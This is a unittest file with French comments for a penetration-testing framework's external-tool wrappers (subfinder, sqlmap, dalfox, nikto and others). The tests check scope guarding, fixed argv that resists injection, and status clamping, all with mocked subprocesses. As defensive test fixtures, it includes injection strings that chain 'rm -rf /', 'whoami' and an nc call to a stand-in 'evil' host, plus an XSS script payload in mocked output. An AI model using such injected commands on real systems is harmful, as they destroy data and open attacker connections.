"""LOT MIGRATION-SUPERSET — wrapper GÉNÉRIQUE d'outils externes (`forge/modules/toolspec.py`) + le
catalogue d'outils OSS PRÉ-WRAPPÉS (`forge/modules/toolcatalog.py`).

Garanties prouvées (subprocess MOCKÉ — zéro I/O réel) :
  (A) AUTO-INTÉGRATION : un tool-spec s'enregistre dans techniques.py + le registre @register et
      apparaît AUTOMATIQUEMENT dans `modules --json`, `by_vuln_class`, le pipeline, les profils —
      SANS câblage par-technique. L'invariant global `set(mods.kinds()) == technique_kinds()` tient,
      le mitre du module == la table, et les flags de profil sont cohérents.
  (B) SCOPE-GUARD fail-closed : cible HORS périmètre -> `skipped`, ZÉRO I/O (runner.tool JAMAIS appelé) ;
      un ASSET DÉCOUVERT hors périmètre n'est JAMAIS émis (re-validation fail-closed).
  (C) NO-SHELL / argv FIXE : une cible avec métacaractères shell reste UN SEUL élément d'argv
      (anti-injection) ; groupes optionnels tout-ou-rien.
  (D) DÉGRADATION GRACIEUSE : binaire absent (available False, ou runner rc=127) -> `skipped` (offline-safe).
  (E) PROOF-ORIENTED : les hits deviennent `tested`/`reported_by_tool` AVEC attribution de l'outil,
      JAMAIS `vulnerable` (statut CLAMPÉ) ; PLANCHER EXPLOIT : sqlmap (exploit) gaté par l'opt-in.
"""
import io
import json
import sys
import unittest
from contextlib import redirect_stdout
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from forge import cli                                          # noqa: E402
from forge import runner                                      # noqa: E402
from forge import modules as mods                              # noqa: E402
from forge import techniques                                  # noqa: E402
from forge import session as sessionmod                        # noqa: E402
from forge.session import SessionStore                         # noqa: E402
from forge.roe import Action, Scope                            # noqa: E402
from forge.modules.toolspec import (ToolSpec, build_argv, parse_output, make_module,   # noqa: E402
                                    spec_to_technique, ExternalToolModule)

# Intégrations externes SUPPLÉMENTAIRES (recon/scan/OSINT, non-destructif/non-exploit, proof-oriented).
NEW_KINDS = {
    "recon.masscan", "recon.gobuster_dns", "recon.theharvester",
    "fuzz.wfuzz", "web.zap_baseline",
    # SONDES RÉSEAU GOUVERNÉES (HTTP/DNS) — non-exploit/non-destructif, scope-guardées, UI-configurables.
    "recon.curl", "recon.dig",
}

# Les kinds livrés par le catalogue (toolcatalog.py) — pinnés pour prouver l'auto-intégration.
# NEW_KINDS y est FONDU : toutes les assertions d'auto-intégration (registered / mitre / profils /
# pipeline / modules --json / flags cohérents / deps enregistrées) s'appliquent AUSSI aux nouveaux.
CATALOG_KINDS = {
    "recon.subfinder", "recon.amass", "recon.dnsx", "recon.naabu",
    "recon.katana", "recon.gau", "recon.gospider", "recon.feroxbuster",
    "recon.whatweb", "recon.wafw00f",
    "web.nikto", "web.wpscan", "web.testssl", "xss.dalfox", "sqli.sqlmap",
} | NEW_KINDS


class _Patch:
    """Remplace temporairement des attributs du module `runner` (référencé à l'appel par toolspec)."""

    def __init__(self, **attrs):
        self.attrs = attrs
        self.saved = {}

    def __enter__(self):
        for k, v in self.attrs.items():
            self.saved[k] = getattr(runner, k)
            setattr(runner, k, v)
        return self

    def __exit__(self, *a):
        for k, v in self.saved.items():
            setattr(runner, k, v)


def _boom(*a, **k):
    raise AssertionError("runner.tool appelé alors que le scope-guard/plancher aurait dû court-circuiter")


def _rows_json():
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = cli.cmd_modules(type("A", (), {"json": True})())
    assert rc == 0
    return {r["kind"]: r for r in json.loads(buf.getvalue())}


# =================================================================================================
class TestAutoIntegration(unittest.TestCase):
    """(A) le tool-spec apparaît partout, dérivé de la table unique."""

    def test_catalog_kinds_registered_as_modules(self):
        for k in CATALOG_KINDS:
            self.assertIn(k, mods.kinds(), f"{k} non enregistré comme module")
            self.assertIsInstance(mods.get(k), ExternalToolModule, f"{k} n'est pas un wrapper externe")

    def test_global_invariant_registered_equals_technique_kinds(self):
        # le contrat structurel : le registre de modules == l'ensemble des kinds-techniques.
        self.assertEqual(set(mods.kinds()), set(techniques.technique_kinds()))

    def test_catalog_disjoint_union_preserved(self):
        # register_kind mute TECHNIQUES ET CATALOG -> l'invariant CATALOG == TECHNIQUES ∪ SURFACE tient.
        self.assertEqual(set(techniques.CATALOG),
                         set(techniques.TECHNIQUES) | set(techniques.SURFACE))

    def test_by_vuln_class_groups_new_tools(self):
        bvc = techniques.by_vuln_class()
        self.assertIn("xss.dalfox", bvc.get("XSS", []))
        self.assertIn("sqli.sqlmap", bvc.get("SQLi", []))
        self.assertIn("recon.naabu", bvc.get("PortScan", []))
        self.assertIn("recon.feroxbuster", bvc.get("ContentDiscovery", []))
        self.assertIn("web.testssl", bvc.get("TLS", []))
        self.assertIn("recon.subfinder", bvc.get("Recon", []))

    def test_appears_in_modules_json_with_taxonomy(self):
        rows = _rows_json()
        for k in CATALOG_KINDS:
            self.assertIn(k, rows, f"{k} absent de `forge modules --json`")
            self.assertTrue(rows[k]["vuln_class"], f"{k} sans vuln_class dans modules --json")
            self.assertIn("pentest", rows[k]["profiles"])
            self.assertFalse(rows[k]["bug_bounty_eligible"], f"{k} : scanner -> non payable en propre")

    def test_mitre_matches_table(self):
        for k in CATALOG_KINDS:
            self.assertEqual(mods.get(k).mitre, techniques.mitre_for(k), f"mitre dérive pour {k}")

    def test_profile_flags_coherent(self):
        for k in CATALOG_KINDS:
            t = techniques.technique_for(k)
            self.assertNotEqual(t.bug_bounty_eligible, t.pentest_only, f"{k} flags incohérents")
            self.assertEqual(t.stage, t.phase, f"{k} stage != phase")
            self.assertTrue(t.tools, f"{k} sans tools")
            for dep in t.depends_on:                     # deps référencent des kinds enregistrés
                self.assertIn(dep, set(mods.kinds()), f"{k}: depends_on {dep} non enregistré")

    def test_pipeline_and_profiles(self):
        order = techniques.pipeline_ordered()
        pentest = techniques.profile_set("pentest")
        for k in CATALOG_KINDS:
            self.assertIn(k, order)
            self.assertIn(k, pentest)                     # pentest peut tout lancer
        # exploit-only (sqlmap) est EXCLU du profil bug_bounty strict.
        self.assertNotIn("sqli.sqlmap", techniques.profile_set("bug_bounty"))


# =================================================================================================
class TestArgvNoShell(unittest.TestCase):
    """(C) argv fixe, anti-injection — une cible avec métacaractères shell reste UN élément."""

    METACHAR = "a.com; rm -rf / && `whoami` $(id) | nc evil 1"

    def test_metachars_stay_single_argv_element(self):
        spec = ToolSpec(kind="t.raw", vuln_class="Recon", binary="tool",
                        argv_template=("-x", "{target}", "--flag"))
        argv = build_argv(spec, self.METACHAR, {})
        self.assertEqual(argv, ["-x", self.METACHAR, "--flag"])
        # aucun élément n'a été découpé sur un métacaractère shell.
        self.assertEqual(len(argv), 3)
        self.assertIn(self.METACHAR, argv)

    def test_catalog_spec_builds_fixed_argv(self):
        m = mods.get("recon.subfinder")
        argv = build_argv(m.spec, "evil.com; id", {})
        self.assertEqual(argv, ["-silent", "-d", "evil.com; id"])   # host normalisé, UN élément

    def test_optional_group_dropped_when_param_missing(self):
        # feroxbuster : le groupe (-w {param:wordlist}) est tout-ou-rien -> abandonné sans le param.
        spec = mods.get("recon.feroxbuster").spec
        without = build_argv(spec, "http://good.test", {})
        self.assertNotIn("-w", without)
        withwl = build_argv(spec, "http://good.test", {"wordlist": "/tmp/wl.txt"})
        self.assertEqual(withwl[-2:], ["-w", "/tmp/wl.txt"])

    def test_default_valued_param_always_present(self):
        # sqlmap : {param:level:1} porte un défaut -> le groupe (--level 1) est TOUJOURS présent.
        spec = mods.get("sqli.sqlmap").spec
        argv = build_argv(spec, "http://good.test/?id=1", {})
        self.assertIn("--level", argv)
        self.assertIn("1", argv)

    def test_target_url_gets_scheme(self):
        spec = ToolSpec(kind="t.u", vuln_class="Recon", binary="t", argv_template=("{target_url}",))
        self.assertEqual(build_argv(spec, "good.test", {}), ["http://good.test"])
        self.assertEqual(build_argv(spec, "https://good.test", {}), ["https://good.test"])


# =================================================================================================
class TestScopeGuardZeroIO(unittest.TestCase):
    """(B) hors périmètre -> skipped, ZÉRO I/O (runner.tool JAMAIS appelé)."""

    def test_out_of_scope_target_refused_zero_io(self):
        m = mods.get("recon.subfinder")
        with _Patch(tool=_boom, available=lambda *a, **k: True):   # tool doit NE PAS être atteint
            f = m.fire(Action("recon.subfinder", "evil.attacker.com",
                              params={"in_scope": ["good.test"]}))
        self.assertEqual(f[0].status, "skipped")
        self.assertIn("hors périmètre", f[0].title)

    def test_discovered_asset_out_of_scope_dropped(self):
        # scope-guard sur les ASSETS DÉCOUVERTS : subfinder renvoie 2 in-scope + 1 hors-scope -> le
        # hors-scope n'est JAMAIS émis (fail-closed), même si l'outil l'a « trouvé ».
        m = mods.get("recon.subfinder")
        out = "a.good.test\nb.good.test\nevil.attacker.com\n"
        with _Patch(available=lambda *a, **k: True, tool=lambda *a, **k: (0, out, "")):
            f = m.fire(Action("recon.subfinder", "good.test",
                              params={"in_scope": ["good.test", "*.good.test"]}))
        targets = {x.target for x in f}
        self.assertIn("a.good.test", targets)
        self.assertIn("b.good.test", targets)
        self.assertNotIn("evil.attacker.com", targets)          # fail-closed
        for x in f:
            self.assertNotEqual(x.status, "vulnerable")


# =================================================================================================
class TestDegradeWhenAbsent(unittest.TestCase):
    """(D) binaire absent -> skipped (offline-safe)."""

    def test_available_false_skips(self):
        m = mods.get("recon.katana")
        with _Patch(available=lambda *a, **k: False, tool=_boom):
            f = m.fire(Action("recon.katana", "good.test", params={"in_scope": ["good.test"]}))
        self.assertEqual(f[0].status, "skipped")
        self.assertIn("absent", f[0].title)

    def test_runner_unavailable_rc127_skips(self):
        m = mods.get("web.nikto")
        with _Patch(available=lambda *a, **k: True,
                    tool=lambda *a, **k: (127, "", "indisponible")):
            f = m.fire(Action("web.nikto", "good.test", params={"in_scope": ["good.test"]}))
        self.assertEqual(f[0].status, "skipped")

    def test_timeout_rc124_skips(self):
        m = mods.get("web.testssl")
        with _Patch(available=lambda *a, **k: True, tool=lambda *a, **k: (124, "", "timeout")):
            f = m.fire(Action("web.testssl", "good.test", params={"in_scope": ["good.test"]}))
        self.assertEqual(f[0].status, "skipped")


# =================================================================================================
class TestProofOriented(unittest.TestCase):
    """(E) hits -> tested/reported_by_tool AVEC attribution, JAMAIS vulnerable."""

    def test_scanner_hits_reported_by_tool_never_vulnerable(self):
        m = mods.get("xss.dalfox")
        out = ("Scanning https://good.test ...\n"
               "[POC][G] https://good.test/?q=<script>alert(1)</script>\n"
               "[POC][B] https://good.test/?q=blind\n")
        with _Patch(available=lambda *a, **k: True, tool=lambda *a, **k: (0, out, "")):
            f = m.fire(Action("xss.dalfox", "http://good.test/?q=1",
                              params={"in_scope": ["good.test"]}))
        self.assertEqual(len(f), 2)                              # les 2 lignes [POC], pas le banner
        for x in f:
            self.assertEqual(x.status, "reported_by_tool")
            self.assertEqual(x.tool, "dalfox")
            self.assertNotEqual(x.status, "vulnerable")
            self.assertEqual(x.mitre, "T1059")

    def test_recon_hits_tested_and_attributed_to_asset(self):
        m = mods.get("recon.subfinder")
        with _Patch(available=lambda *a, **k: True,
                    tool=lambda *a, **k: (0, "api.good.test\ndev.good.test\n", "")):
            f = m.fire(Action("recon.subfinder", "good.test",
                              params={"in_scope": ["good.test", "*.good.test"]}))
        self.assertEqual({x.target for x in f}, {"api.good.test", "dev.good.test"})
        for x in f:
            self.assertEqual(x.status, "tested")
            self.assertEqual(x.tool, "subfinder")

    def test_no_hits_yields_single_tested_finding(self):
        m = mods.get("recon.subfinder")
        with _Patch(available=lambda *a, **k: True, tool=lambda *a, **k: (0, "", "")):
            f = m.fire(Action("recon.subfinder", "good.test", params={"in_scope": ["good.test"]}))
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].status, "tested")

    def test_status_clamped_never_vulnerable(self):
        # même un spec mal déclaré (hit_status='vulnerable') est CLAMPÉ à reported_by_tool.
        spec = ToolSpec(kind="bad.spec", vuln_class="XSS", binary="b", argv_template=("{target_url}",),
                        parser="lines", hit_status="vulnerable", hit_is_asset=False)
        cls = make_module(spec)
        mod = cls()
        with _Patch(available=lambda *a, **k: True, tool=lambda *a, **k: (0, "hit-line\n", "")):
            f = mod.fire(Action("bad.spec", "good.test", params={"in_scope": ["good.test"]}))
        self.assertEqual(f[0].status, "reported_by_tool")
        self.assertNotEqual(f[0].status, "vulnerable")

    def test_parse_output_pure_variants(self):
        # parseurs purs : lines / regex / json / jsonl.
        s_lines = ToolSpec(kind="p.l", vuln_class="Recon", binary="b", argv_template=(), parser="lines")
        self.assertEqual(parse_output(s_lines, 0, "a\n\nb\na\n"), ["a", "b"])   # dédup + strip
        s_rx = ToolSpec(kind="p.r", vuln_class="X", binary="b", argv_template=(),
                        parser="regex", parser_regex=r"(?m)^\+ (.*)$")
        self.assertEqual(parse_output(s_rx, 0, "+ one\nnoise\n+ two\n"), ["one", "two"])
        s_j = ToolSpec(kind="p.j", vuln_class="X", binary="b", argv_template=(),
                       parser="json", parser_json_path=("host",))
        self.assertEqual(parse_output(s_j, 0, '[{"host":"h1"},{"host":"h2"}]'), ["h1", "h2"])
        s_jl = ToolSpec(kind="p.jl", vuln_class="X", binary="b", argv_template=(),
                        parser="jsonl", parser_json_path=("url",))
        self.assertEqual(parse_output(s_jl, 0, '{"url":"u1"}\ngarbage\n{"url":"u2"}'), ["u1", "u2"])


# =================================================================================================
class TestExploitFloor(unittest.TestCase):
    """(E) sqlmap (exploit) gaté par le plancher opt-in — défense en profondeur au-delà du ROE engine."""

    def test_exploit_declared_on_module_and_table(self):
        self.assertTrue(mods.get("sqli.sqlmap").exploit)
        self.assertTrue(techniques.technique_for("sqli.sqlmap").exploit)
        # scanners recon ne sont PAS exploit.
        self.assertFalse(mods.get("recon.subfinder").exploit)

    def test_bound_scope_without_optin_refuses_zero_io(self):
        m = mods.get("sqli.sqlmap")
        store = SessionStore(Scope({"in_scope": ["good.test"]}))          # lié SANS allow_exploit
        with _Patch(available=lambda *a, **k: True, tool=_boom):
            with sessionmod.using(store):
                f = m.fire(Action("sqli.sqlmap", "http://good.test/?id=1",
                                  params={"in_scope": ["good.test"]}, exploit=True))
        self.assertEqual(f[0].status, "skipped")
        self.assertIn("plancher exploit", f[0].title)

    def test_optin_armed_runs(self):
        m = mods.get("sqli.sqlmap")
        store = SessionStore(Scope({"in_scope": ["good.test"], "allow_exploit": True}))
        out = "Parameter: id (GET)\nback-end DBMS: MySQL\n"
        with _Patch(available=lambda *a, **k: True, tool=lambda *a, **k: (0, out, "")):
            with sessionmod.using(store):
                f = m.fire(Action("sqli.sqlmap", "http://good.test/?id=1",
                                  params={"in_scope": ["good.test"]}, exploit=True))
        self.assertTrue(f)
        for x in f:
            self.assertIn(x.status, ("reported_by_tool", "tested"))
            self.assertNotEqual(x.status, "vulnerable")


# =================================================================================================
class TestNewIntegrations(unittest.TestCase):
    """Intégrations externes AJOUTÉES (masscan, gobuster-dns, theHarvester, wfuzz, ZAP baseline) —
    enregistrées, gouvernées (scope-guard ZÉRO I/O), no-shell, NON-exploit / NON-destructif, et
    présentes dans les vues dérivées (mitre_for / by_vuln_class / technique_for)."""

    def test_all_new_kinds_registered_as_external_modules(self):
        for k in NEW_KINDS:
            self.assertIn(k, mods.kinds(), f"{k} non enregistré comme module")
            self.assertIsInstance(mods.get(k), ExternalToolModule, f"{k} n'est pas un wrapper externe")

    def test_new_kinds_in_derived_views(self):
        # chaque nouvelle technique est FOLDÉE dans techniques.CATALOG + résolveur mitre_for.
        for k in NEW_KINDS:
            self.assertIsNotNone(techniques.technique_for(k), f"{k} absent de CATALOG")
            self.assertTrue(techniques.mitre_for(k), f"{k} sans mitre dans la table")
            self.assertEqual(mods.get(k).mitre, techniques.mitre_for(k), f"mitre dérive pour {k}")
        bvc = techniques.by_vuln_class()
        self.assertIn("recon.masscan", bvc.get("PortScan", []))
        self.assertIn("recon.gobuster_dns", bvc.get("SubdomainEnum", []))
        self.assertIn("recon.theharvester", bvc.get("OSINT", []))
        self.assertIn("fuzz.wfuzz", bvc.get("Fuzzing", []))
        self.assertIn("web.zap_baseline", bvc.get("WebScan", []))

    def test_new_kinds_non_exploit_non_destructive(self):
        # philosophie proof-oriented : recon/scan/OSINT -> jamais exploit, jamais destructif.
        for k in NEW_KINDS:
            m = mods.get(k)
            self.assertFalse(m.exploit, f"{k} ne doit pas être exploit")
            self.assertFalse(m.destructive, f"{k} ne doit pas être destructif")
            self.assertFalse(techniques.technique_for(k).exploit, f"{k} exploit dans la table")
        self.assertEqual(techniques.technique_for("recon.theharvester").capability, "passive")

    def test_new_kinds_scope_guard_zero_io(self):
        # cible HORS périmètre -> skipped, runner.tool JAMAIS atteint (fail-closed).
        for k in NEW_KINDS:
            m = mods.get(k)
            with _Patch(tool=_boom, available=lambda *a, **k: True):
                f = m.fire(Action(k, "evil.attacker.com", params={"in_scope": ["good.test"]}))
            self.assertEqual(f[0].status, "skipped", f"{k} n'a pas été bloqué hors scope")
            self.assertIn("hors périmètre", f[0].title, f"{k} mauvais motif de skip")

    def test_new_kinds_argv_no_shell(self):
        # une cible avec métacaractères shell reste dans UN SEUL élément d'argv (anti-injection).
        meta = "good.test; rm -rf / && `id`"
        for k in NEW_KINDS:
            argv = build_argv(mods.get(k).spec, meta, {"wordlist": "/tmp/wl.txt"})
            # aucun élément ne doit être un fragment shell isolé produit par une découpe.
            self.assertNotIn("rm", argv)
            self.assertNotIn("&&", argv)
            # le token qui porte la cible la contient INTÉGRALEMENT (au moins jusqu'au 1er '/').
            self.assertTrue(any("good.test" in e for e in argv), f"{k}: cible absente de l'argv {argv}")

    def test_new_kinds_hits_never_vulnerable(self):
        # les hits sont CLAMPÉS à tested/reported_by_tool — jamais vulnerable.
        samples = {
            "recon.masscan": "Discovered open port 443/tcp on 1.2.3.4\n",
            "recon.gobuster_dns": "Found: api.good.test\n",
            "recon.theharvester": "foo@good.test\nwww.good.test\n",
            "fuzz.wfuzz": "000000001:   200        0 L   3 W   45 Ch   \"admin\"\n",
            "web.zap_baseline": "WARN-NEW: Cookie No HttpOnly Flag [10010] x 3\n",
        }
        for k, out in samples.items():
            m = mods.get(k)
            with _Patch(available=lambda *a, **k: True, tool=lambda *a, **k: (0, out, "")):
                f = m.fire(Action(k, "http://good.test/",
                                  params={"in_scope": ["good.test", "*.good.test"]}))
            self.assertTrue(f, f"{k}: aucun finding")
            for x in f:
                self.assertIn(x.status, ("tested", "reported_by_tool"), f"{k}: statut {x.status}")
                self.assertNotEqual(x.status, "vulnerable")

    def test_zap_docker_invocation_includes_script(self):
        # l'entrypoint de l'image ZAP n'est pas le script -> zap-baseline.py doit être le 1er token
        # d'argv pour que `docker run IMG zap-baseline.py -t URL` soit correct.
        spec = mods.get("web.zap_baseline").spec
        argv = build_argv(spec, "https://good.test", {})
        self.assertEqual(argv[0], "zap-baseline.py")
        self.assertIn("-t", argv)
        self.assertNotIn("-a", argv)                 # PASSIF : aucune attaque active


if __name__ == "__main__":
    unittest.main(verbosity=2)
